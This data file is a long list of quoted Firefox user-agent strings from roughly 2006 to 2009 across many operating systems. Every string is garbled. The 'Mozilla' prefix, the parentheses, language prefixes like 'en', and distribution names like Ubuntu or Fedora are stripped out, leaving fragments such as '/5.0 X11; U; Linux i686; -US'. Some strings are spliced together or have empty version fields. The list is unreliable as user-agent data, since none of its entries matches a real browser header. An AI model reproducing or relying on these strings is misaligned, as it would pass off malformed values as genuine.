	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.11 Gecko/2009060310 Linux /6  Firefox/3.0.11"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.11 Gecko/2009060308 Linux /7  Firefox/3.0.11"
	"/5.0 X11; U; Linux i686; -GB; rv:1.9.0.11 Gecko/2009060309 Firefox/3.0.11"
	"/5.0 X11; U; Linux i686; -GB; rv:1.9.0.11 Gecko/2009060308 /9.04 jaunty Firefox/3.0.11 GTB5"
	"/5.0 X11; U; Linux i686; -GB; rv:1.9.0.11 Gecko/2009060214 Firefox/3.0.11"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.11 Gecko/2009062218 Gentoo Firefox/3.0.11"
	"/5.0 X11; U;  Linux i686; -US; rv:1.9.0.10 Gecko/2009042315 Firefox/3.0.10"
	"/5.0 X11; U; Linux x86_64; -GB; rv:1.9.0.10 Gecko/2009042523 /9.04 jaunty Firefox/3.0.10"
	"/5.0 X11; U; Linux x86_64; -DK; rv:1.9.0.10 Gecko/2009042523 /9.04 jaunty Firefox/3.0.10"
	"/5.0 X11; U; Linux i686; tr-TR; rv:1.9.0.10 Gecko/2009042523 /9.04 jaunty Firefox/3.0.10"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.9.0.10 Gecko/2009042513 /8.04 hardy Firefox/3.0.10"
	"/5.0 X11; U; Linux i686; -HU; rv:1.9.0.10 Gecko/2009042718 CentOS/3.0.10-1.el5.centos Firefox/3.0.10"
	"/5.0 X11; U; Linux i686; fr; rv:1.9.0.10 Gecko/2009042708 /3.0.10-1.fc10 Firefox/3.0.10"
	"/5.0 X11; U; Linux i686; fr; rv:1.9.0.10 Gecko/2009042513 /8.04 hardy Firefox/3.0.10"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.9.0.10 Gecko/2009042523 /9.04 jaunty Firefox/3.0.10"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.9.0.10 Gecko/2009042513 Linux /5  Firefox/3.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.6 Gecko/2009020410 /3.0.6-1.fc10 Firefox/3.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.10 Gecko/2009042812 Gentoo Firefox/3.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.10 Gecko/2009042708 /3.0.10-1.fc10 Firefox/3.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.10 Gecko/2009042523 /8.10  Firefox/3.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.10 Gecko/2009042523 Linux /7  Firefox/3.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.10 Gecko/2009042523 Linux /6  Firefox/3.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.10 Gecko/2009042513 Linux /5  Firefox/3.0.10"
	"/5.0 X11; U; Linux i686; -GB; rv:1.9.0.10 Gecko/2009042523 /8.10  Firefox/3.0.10"
	"/5.0 X11; U; Linux i686; -GB; rv:1.9.0.10 Gecko/2009042513 /8.04 hardy Firefox/3.0.10"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.10 Gecko/2009042523 /9.04 jaunty Firefox/3.0.10"
	"/5.0 X11; U; OpenBSD amd64; -US; rv:1.9.0.1 Gecko/2008081402 Firefox/3.0.1"
	"/5.0 X11; U; Linux x86_64; rv:1.9.0.1 Gecko/2008072820 Firefox/3.0.1"
	"/5.0 X11; U; Linux x86_64; pl-PL; rv:1.9.0.1 Gecko/2008071222 /hardy Firefox/3.0.1"
	"/5.0 X11; U; Linux x86_64; pl-PL; rv:1.9.0.1 Gecko/2008071222  hardy Firefox/3.0.1"
	"/5.0 X11; U; Linux x86_64; pl-PL; rv:1.9.0.1 Gecko/2008071222 Firefox/3.0.1"
	"/5.0 X11; U; Linux x86_64; ko-KR; rv:1.9.0.1 Gecko/2008071717 Firefox/3.0.1"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.0.1 Gecko/2008071717 Firefox/3.0.1"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.9.0.1 Gecko/2008071222 Firefox/3.0.1"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.9.0.1 Gecko/2008070400 SUSE/3.0.1-1.1 Firefox/3.0.1"
	"/5.0 X11; U; Linux x86_64; es-ES; rv:1.9.0.1 Gecko/2008072820 Firefox/3.0.1"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.1 Gecko/2008110312 Gentoo Firefox/3.0.1"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.1 Gecko/2008072820 /8.04 hardy Firefox/3.0.1"
	"/5.0 X11; U; Linux x86_64; -GB; rv:1.9.0.1 Gecko/2008072820 Firefox/3.0.1 FirePHP/0.1.1.2"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9.0.1 Gecko/2008070400 SUSE/3.0.1-0.1 Firefox/3.0.1"
	"/5.0 X11; U; Linux x86_64 Gecko/2008072820 Firefox/3.0.1"
	"/5.0 X11; U; Linux i686; rv:1.9 Gecko/20080810020329 Firefox/3.0.1"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.1 Gecko/2008071719 Firefox/3.0.1"
	"/5.0 X11; U; Linux i686; ; rv:1.9.0.1 Gecko/2008070208 Firefox/3.0.1"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.9.0.1 Gecko/2008071719 Firefox/3.0.1"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.9.0.1 Gecko/2008071222 Firefox/3.0.1"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.0.8 Gecko/2009032609 Firefox/3.0.0 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.0.1 Gecko/2008070208 Firefox/3.0.0"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.0.1 Gecko/2008070208 Firefox/3.0.0"
	"/6.0 Macintosh; U; PPC Mac OS X Mach-O; -US; rv:2.0.0.0 Gecko/20061028 Firefox/3.0"
	"/5.0 X11; U; SunOS ; -IT;  Gecko/20080000 Firefox/3.0"
	"/5.0 X11; U; Linux x86_64; pl-PL; rv:1.9 Gecko/2008060309 Firefox/3.0"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9 Gecko/2008061017 Firefox/3.0"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.9 Gecko/2008061017 Firefox/3.0"
	"/5.0 X11; U; Linux x86_64; es-AR; rv:1.9 Gecko/2008061017 Firefox/3.0"
	"/5.0 X11; U; Linux x86_64; es-AR; rv:1.9 Gecko/2008061015 /8.04 hardy Firefox/3.0"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0 Gecko/2008061600 SUSE/3.0-1.2 Firefox/3.0"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9 Gecko/2008062908 Firefox/3.0 -3.0~rc2-2"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9 Gecko/2008062315 Gentoo Firefox/3.0"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9 Gecko/2008061317 Gentoo Firefox/3.0"
	"/5.0 X11; U; Linux x86_64; ; rv:1.9 Gecko/2008061017 Firefox/3.0"
	"/5.0 X11; U; Linux i686; tr-TR; rv:1.9.0 Gecko/2008061600 SUSE/3.0-1.2 Firefox/3.0"
	"/5.0 X11; U; Linux i686; sk; rv:1.9.1 Gecko/20090630 /3.5-1.fc11 Firefox/3.0"
	"/5.0 X11; U; Linux i686; sk; rv:1.9 Gecko/2008061015 Firefox/3.0"
	"/5.0 X11; U; Linux i686; rv:1.9 Gecko/2008080808 Firefox/3.0"
	"/5.0 X11; U; Linux i686; ; rv:1.9 Gecko/2008061812 Firefox/3.0"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.9.0.5 Gecko/2008121622 /2.6.27-PiP Firefox/3.0"
	"/5.0 X11; U; Linux i686; nl; rv:1.9 Gecko/2008061015 Firefox/3.0"
	"/5.0 X11; U; Linux i686; ; rv:1.9 Gecko/2008061015 Firefox/3.0"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.0.15 Gecko/2009101601 Firefox 2.1 .NET CLR 3.5.30729"
	"/5.0 Macintosh; U; PPC Mac OS X Mach-O; -US; rv:1.8.1b1 Gecko/20061110 Firefox/2.0b3"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.1 Gecko/20060918 Firefox/2.0b2"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.1 Gecko/20060916 Firefox/2.0b2"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.12 Gecko/20080208 Firefox/2.0b2"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.8.1b2 Gecko/20060821 Firefox/2.0b2"
	"/5.0 Windows; U; Windows NT 5.1; pl; rv:1.8.1.1 Gecko/20061204 /5.0 X11; U; Linux i686; fr; rv:1.8.1 Gecko/20060918 Firefox/2.0b2"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.1b2 Gecko/20060821 Firefox/2.0b2"
	"/5.0 Windows; U; Windows NT 5.1; -GB; rv:1.8.1b2 Gecko/20060821 Firefox/2.0b2"
	"/5.0 BeOS; U; BeOS BePC; -US; rv:1.8.1b2 Gecko/20060901 Firefox/2.0b2"
	"/5.0 X11; U; Linux i686; pl; rv:1.8.1b1 Gecko/20060710 Firefox/2.0b1"
	"/5.0 X11; U; Linux i686; en_US; rv:1.8.1b1 Gecko/20060813 Firefox/2.0b1"
	"/5.0 X11; U; Linux i686; -GB; rv:1.8.1b1 Gecko/20060710 Firefox/2.0b1"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.1b1 Gecko/20060710 Firefox/2.0b1"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.1b1 Gecko/20060707 Firefox/2.0b1"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.8.1b1 Gecko/20060710 Firefox/2.0b1"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.8.1b1 Gecko/20060710 Firefox/2.0b1"
	"/5.0 Windows; U; Windows NT 5.0; -US; rv:1.8.1b1 Gecko/20060710 Firefox/2.0b1"
	"/5.0 Macintosh; U; PPC Mac OS X Mach-O; -US; rv:1.8.1b1 Gecko/20060710 Firefox/2.0b1"
	"/5.0 Macintosh; U; PPC Mac OS X Mach-O; -US; rv:1.8.1b1 Gecko/20060707 Firefox/2.0b1"
	"/5.0 Macintosh; U; Intel Mac OS X; -US; rv:1.8.1b1 Gecko/20060710 Firefox/2.0b1"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1 Gecko/20061001 Firefox/2.0b Swiftfox"
	"/5.0 Windows; U; Windows NT 5.1; es-ES; rv:1.8 Gecko/20060321 Firefox/2.0a1"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8 Gecko/20060319 Firefox/2.0a1"
	"/5.0 Macintosh; U; PPC Mac OS X Mach-O; -US; rv:1.8 Gecko/20060322 Firefox/2.0a1"
	"/5.0 Macintosh; U; PPC Mac OS X Mach-O; -US; rv:1.8 Gecko/20060320 Firefox/2.0a1"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.1.16 Gecko/20080702 Firefox/2.0.9.9"
	"/5.0 Macintosh; U; PPC Mac OS X Mach-O; -US; rv:1.8.1.4 Gecko/20070515 Firefox/2.0.4"
	"/5.0 X11; U; SunOS sun4v; es-ES; rv:1.8.1.9 Gecko/20071127 Firefox/2.0.0.9"
	"/5.0 X11; U; SunOS ; -US; rv:1.8.1.9 Gecko/20071102 Firefox/2.0.0.9"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.9 Gecko/20071025 Firefox/2.0.0.9"
	"/5.0 X11; U; Linux i686; nl-NL; rv:1.8.1.9 Gecko/20071105 Firefox/2.0.0.9"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.9 Gecko/20071105 Firefox/2.0.0.9"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.9 Gecko/20071105 /2.0.0.9-1.fc7 Firefox/2.0.0.9"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.9 Gecko/20071103 Firefox/2.0.0.9 Swiftfox"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.9 Gecko/20071103 Firefox/2.0.0.9"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.9 Gecko/20071025 FreeBSD/i386 Firefox/2.0.0.9"
	"/5.0 X11; U; Linux i686; -GB; rv:1.8.1.9 Gecko/20071105 Firefox/2.0.0.9"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.9 Gecko/20071025 Firefox/2.0.0.9"
	"/5.0 X11; U; Linux i686 x86_64; -GB; rv:1.8.1.9 Gecko/20071025 Firefox/2.0.0.9"
	"/5.0 Windows; Windows NT 5.1; -US; rv:1.8.1.9 Gecko/20071025 Firefox/2.0.0.9"
	"/5.0 Windows; U; Windows NT 6.0; tr; rv:1.8.1.9 Gecko/20071025 Firefox/2.0.0.9"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.8.1.9 Gecko/20071025 Firefox/2.0.0.9"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.8.1.9 Gecko/20071025 Firefox/2.0.0.9"
	"/5.0 Windows; U; Windows NT 5.2; ; rv:1.8.1.9 Gecko/20071025 Firefox/2.0.0.9"
	"/5.0 Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.9 Gecko/20071025 Firefox/2.0.0.9"
	"/5.0 Windows; U; Windows NT 5.1; tr; rv:1.8.1.9 Gecko/20071025 Firefox/2.0.0.9"
	"/5.0 Windows; U; Windows NT 5.1; sl; rv:1.8.1.9 Gecko/20071025 Firefox/2.0.0.9"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv: Gecko/20080715 Firefox/"
	"/5.0 X11; U; x86_64 Linux; en_US; rv:1.8.16 Gecko/20071015 Firefox/2.0.0.8"
	"/5.0 X11; U; Windows NT i686; fr; rv:1.9.0.1 Gecko/2008070206 Firefox/2.0.0.8"
	"/5.0 X11; U; Linux x86_64; ; rv:1.8.1.8 Gecko/20071022 /7.10 gutsy Firefox/2.0.0.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.8 Gecko/20071022 /7.10 gutsy Firefox/2.0.0.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.8 Gecko/20071015 SUSE/2.0.0.8-1.1 Firefox/2.0.0.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.12 Gecko/20080129 Firefox/2.0.0.8 -2.0.0.12-1"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.8 Gecko/20071022 /7.10 gutsy Firefox/2.0.0.8"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.8.1.8 Gecko/20071022 /7.10 gutsy Firefox/2.0.0.8"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.8 Gecko/20071022 /7.10 gutsy Firefox/2.0.0.8"
	"/5.0 X11; U; Linux i686; fr; rv:1.9.0.1 Gecko/2008070206 Firefox/2.0.0.8"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.1.8 Gecko/20071030 /2.0.0.8-2.fc8 Firefox/2.0.0.8"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.1.8 Gecko/20071022 /7.10 gutsy Firefox/2.0.0.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.8 Gecko/20071201 Firefox/2.0.0.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.8 Gecko/20071022 Firefox/2.0.0.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.8 Gecko/20071019 /2.0.0.8-1.fc7 Firefox/2.0.0.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.8 Gecko/20071008 FreeBSD/i386 Firefox/2.0.0.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.8 Gecko/20071004 Firefox/2.0.0.8 -2.0.0.8-1"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.8 Gecko/20061201 Firefox/2.0.0.8"
	"/5.0 X11; U; Linux i686; -GB; rv:1.8.1.8 Gecko/20071022 /7.10 gutsy Firefox/2.0.0.8"
	"/5.0 X11; U; Linux i686; -GB; rv:1.8.1.8 Gecko/20071008 /7.10 gutsy Firefox/2.0.0.8"
	"/5.0 X11; U; OpenBSD i386; -US; rv:1.8.1.7 Gecko/20070930 Firefox/2.0.0.7"
	"/5.0 X11; U; Linux x86_64; pl; rv:1.8.1.7 Gecko/20071009 Firefox/2.0.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.7 Gecko/20070918 Firefox/2.0.0.7"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.1.7 Gecko/20070914 Firefox/2.0.0.7"
	"/5.0 X11; U; Linux i686; es-AR; rv:1.8.1.6 Gecko/20070914 Firefox/2.0.0.7"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.7 Gecko/20070923 Firefox/2.0.0.7 Swiftfox"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.7 Gecko/20070921 Firefox/2.0.0.7"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.7 Gecko/20070914 Firefox/2.0.0.7 -feisty"
	"/5.0 X11; U; Linux i686; -GB; rv:1.8.1.6 Gecko/20070914 Firefox/2.0.0.7"
	"/5.0 X11; U; Linux i386; -US; rv:1.8.1.7 Gecko/20070914 Firefox/2.0.0.7"
	"/5.0 X11; U; Linux Gentoo; pl-PL; rv:1.8.1.7 Gecko/20070914 Firefox/2.0.0.7"
	"/5.0 X11; U; Linux amd64; -US; rv:1.8.1.7 Gecko/20070914 Firefox/2.0.0.7"
	"/5.0 X11; U; Gentoo Linux x86_64; pl-PL; rv:1.8.1.7 Gecko/20070914 Firefox/2.0.0.7"
	"/5.0 Windows; U; Windows NT 6.0; -IT; rv:1.8.1.7 Gecko/20070914 Firefox/2.0.0.7"
	"/5.0 Windows; U; Windows NT 6.0; fr; rv:1.8.1.7 Gecko/20070914 Firefox/2.0.0.7"
	"/5.0 Windows; U; Windows NT 6.0; en_US; rv:1.8.1.6 Gecko/20070725 Firefox/2.0.0.7"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.8.1.7 Gecko/20070914 Firefox/2.0.0.7"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.8.1.7 Gecko/20070914 Firefox/2.0.0.7"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.8.1.7 Gecko/20070914 Firefox/2.0.0.7"
	"/5.0 Windows; U; Windows NT 5.2; nl; rv:1.8.1.7 Gecko/20070914 Firefox/2.0.0.7"
	"/5.0 X11; U; SunOS ; pl-PL; rv:1.8.1.6 Gecko/20071217 Firefox/2.0.0.6"
	"/5.0 X11; U; SunOS ; -DE; rv:1.8.1.6 Gecko/20070805 Firefox/2.0.0.6"
	"/5.0 X11; U; SunOS i86pc; -ZW; rv:1.8.1.6 Gecko/20071125 Firefox/2.0.0.6"
	"/5.0 X11; U; OpenBSD sparc64; -US; rv:1.8.1.6 Gecko/20070816 Firefox/2.0.0.6"
	"/5.0 X11; U; OpenBSD sparc64; -AU; rv:1.8.1.6 Gecko/20071225 Firefox/2.0.0.6"
	"/5.0 X11; U; OpenBSD i386; -US; rv:1.8.1.6 Gecko/20070819 Firefox/2.0.0.6"
	"/5.0 X11; U; OpenBSD i386; -US; rv:1.8.1.4 Gecko/20070704 Firefox/2.0.0.6"
	"/5.0 X11; U; OpenBSD i386; -DE; rv:1.8.1.6 Gecko/20080429 Firefox/2.0.0.6"
	"/5.0 X11; U; OpenBSD amd64; -US; rv:1.8.1.6 Gecko/20070817 Firefox/2.0.0.6"
	"/5.0 X11; U; NetBSD sparc64; fr-FR; rv:1.8.1.6 Gecko/20070822 Firefox/2.0.0.6"
	"/5.0 X11; U; NetBSD ; -US; rv:1.8.1.6 Gecko/20080115 Firefox/2.0.0.6"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.6 Gecko/20061201 Firefox/2.0.0.6 -feisty"
	"/5.0 X11; U; Linux x86_64; -DE; rv:1.8.1.6 Gecko/20070802 Firefox/2.0.0.6"
	"/5.0 X11; U; Linux x86; -US; rv:1.8.1.6 Gecko/20061201 Firefox/2.0.0.6 -feisty"
	"/5.0 X11; U; Linux i686; pl; rv:1.8.1.6 Gecko/20070725 Firefox/2.0.0.6"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.6 Gecko/20061201 Firefox/2.0.0.6 -feisty"
	"/5.0 X11; U; Linux i686; es-AR; rv:1.8.1.6 Gecko/20070803 Firefox/2.0.0.6 Swiftfox"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.6 Gecko/20070831 Firefox/2.0.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.6 Gecko/20070807 Firefox/2.0.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.6 Gecko/20070804 Firefox/2.0.0.6"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.5 Gecko/20061201 Firefox/2.0.0.5 -feisty"
	"/5.0 X11; U; Linux i686;  7.04; -CH; rv:1.8.1.5 Gecko/20070309 Firefox/2.0.0.5"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.8.1.5 Gecko/20070718 /2.0.0.5-1.fc7 Firefox/2.0.0.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.0.3 Gecko/2008100320 Firefox/2.0.0.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.5 Gecko/20070728 Firefox/2.0.0.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.5 Gecko/20070725 Firefox/2.0.0.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.5 Gecko/20070719 Firefox/2.0.0.5 -2.0.0.5-0etch1"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.5 Gecko/20070718 /2.0.0.5-1.fc7 Firefox/2.0.0.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.5 Gecko/20070713 Firefox/2.0.0.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.5 Gecko/20061201 Firefox/2.0.0.5 -feisty"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.5 Gecko/20070713 Firefox/2.0.0.5"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.5 Gecko/20060911 SUSE/2.0.0.5-1.2 Firefox/2.0.0.5"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.5 Gecko/20070718 /2.0.0.5-1.fc7 Firefox/2.0.0.5"
	"/5.0 X11; U; Linux i686 x86_64; -GB; rv:1.8.1.5 Gecko/20070718 /2.0.0.5-1.fc7 Firefox/2.0.0.5"
	"/5.0 Windows; U; Windows NT 6.0; zh-TW; rv:1.8.1.5 Gecko/20070713 Firefox/2.0.0.5"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.8.1.5 Gecko/20070713 Firefox/2.0.0.5"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.8.1.5 Gecko/20070713 Firefox/2.0.0.5"
	"/5.0 Windows; U; Windows NT 5.2; ; rv:1.8.1.5 Gecko/20070713 Firefox/2.0.0.5"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.8.1.5 Gecko/20070713 Firefox/2.0.0.5"
	"/5.0 Windows; U; Windows NT 5.1; -JP; rv:1.8.1.5 Gecko/20070713 Firefox/2.0.0.5"
	"/5.0 X11; U; Linux i686; -US; rv: Gecko/20070509 Firefox/ Swiftfox"
	"/5.0 X11; U; SunOS ; -US; rv:1.8.1.4 Gecko/20070622 Firefox/2.0.0.4"
	"/5.0 X11; U; SunOS ; -US; rv:1.8.1.4 Gecko/20070531 Firefox/2.0.0.4"
	"/5.0 X11; U; SunOS i86pc; -US; rv:1.8.1.4 Gecko/20070622 Firefox/2.0.0.4"
	"/5.0 X11; U; OpenBSD i386; -US; rv:1.8.1.4 Gecko/20070704 Firefox/2.0.0.4"
	"/5.0 X11; U; Linux x86_64; pl; rv:1.8.1.4 Gecko/20070611 Firefox/2.0.0.4"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.4 Gecko/20070627 Firefox/2.0.0.4"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.4 Gecko/20070604 Firefox/2.0.0.4"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.4 Gecko/20070529 SUSE/2.0.0.4-6.1 Firefox/2.0.0.4"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.4 Gecko/20070515 Firefox/2.0.0.4"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.4 Gecko/20061201 Firefox/2.0.0.4 -feisty"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.4   Gecko/20061201 Firefox/2.0.0.4 -feisty"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.4 Gecko/20070621 Firefox/2.0.0.4"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.4 Gecko/20060601 Firefox/2.0.0.4 -edgy"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.1.4 Gecko/20070515 Firefox/2.0.0.4"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.8.1.4 Gecko/20061201 Firefox/2.0.0.4 -feisty"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.4 Gecko/20070602 Firefox/2.0.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.4 Gecko/20070531 Firefox/2.0.0.4 Swiftfox"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.4 Gecko/20070531 Firefox/2.0.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.4 Gecko/20070530 /2.0.0.4-1.fc7 Firefox/2.0.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.4 Gecko/20070515 Firefox/2.0.0.4 "
	"/5.0 X11; U; Linux i686; -US; rv: Gecko/20070307 Firefox/ Swiftfox"
	"/5.0 Windows; U; Windows NT 5.1; fr; rv:1.8.1.5 Gecko/20070713 Firefox/2.0.0.3C"
	"/5.0 X11; U; SunOS sun4v; -US; rv:1.8.1.3 Gecko/20070321 Firefox/2.0.0.3"
	"/5.0 X11; U; SunOS ; -US; rv:1.8.1.3 Gecko/20070321 Firefox/2.0.0.3"
	"/5.0 X11; U; SunOS i86pc; -US; rv:1.8.1.3 Gecko/20070423 Firefox/2.0.0.3"
	"/5.0 X11; U; OpenBSD i386; -US; rv:1.8.1.3 Gecko/20070505 Firefox/2.0.0.3"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.8.1.3 Gecko/20070322 Firefox/2.0.0.3"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.5 Gecko/2008122010 Firefox/2.0.0.3 -3.0.5-1"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.3 Gecko/20070415 Firefox/2.0.0.3"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.3 Gecko/20070324 Firefox/2.0.0.3"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.3 Gecko/20070322 Firefox/2.0.0.3"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.3 Gecko/20061201 Firefox/2.0.0.3 -feisty"
	"/5.0 X11; U; Linux ppc; -US; rv:1.8.1.3 Gecko/20070310 Firefox/2.0.0.3 -2.0.0.3-1"
	"/5.0 X11; U; Linux i686; zh-TW; rv:1.8.1.3 Gecko/20070309 Firefox/2.0.0.3"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.8.1.3 Gecko/20061201 Firefox/2.0.0.3 -feisty"
	"/5.0 X11; U; Linux i686; nl; rv:1.8.1.3 Gecko/20060601 Firefox/2.0.0.3 -edgy"
	"/5.0 X11; U; Linux i686; nb-NO; rv:1.8.1.3 Gecko/20070310 Firefox/2.0.0.3 -2.0.0.3-1"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.3 Gecko/20070309 Firefox/2.0.0.3"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.3 Gecko/20070410 Firefox/2.0.0.3"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.3 Gecko/20070406 Firefox/2.0.0.3"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.1.3 Gecko/20070310 Firefox/2.0.0.3 -2.0.0.3-2"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.1.3 Gecko/20070309 Firefox/2.0.0.3"
	"/5.0 X11; U; Linux x86_64; pl-PL; rv: Gecko/20061023 SUSE/2.0.0.1-0.1 Firefox/"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv: Gecko/20061023 SUSE/2.0.0.1-0.1 Firefox/"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv: Gecko/20070118 Firefox/"
	"/5.0 X11; U; Linux i686; -US; rv: Gecko/20090327 /8.04 hardy Firefox/"
	"/5.0 X11; U; Linux i686; -US; rv: Gecko/20090327 /7.10 gutsy Firefox/"
	"/5.0 X11; U; Linux i686; ; rv: Gecko/20090327 /7.10 gutsy Firefox/"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.8.1.20 Gecko/20081217 Firefox/2.0.0.21"
	"/5.0 X11; U; SunOS ; -US; rv:1.8.1.20 Gecko/20090108 Firefox/2.0.0.20"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.1.20 Gecko/20081217 Firefox/2.0.0.20"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.20 Gecko/20081217 Firefox2.0.0.20"
	"/5.0 X11; U; Linux i686; -GB; rv:1.8.1.20 Gecko/20081217 Firefox/2.0.0.20"
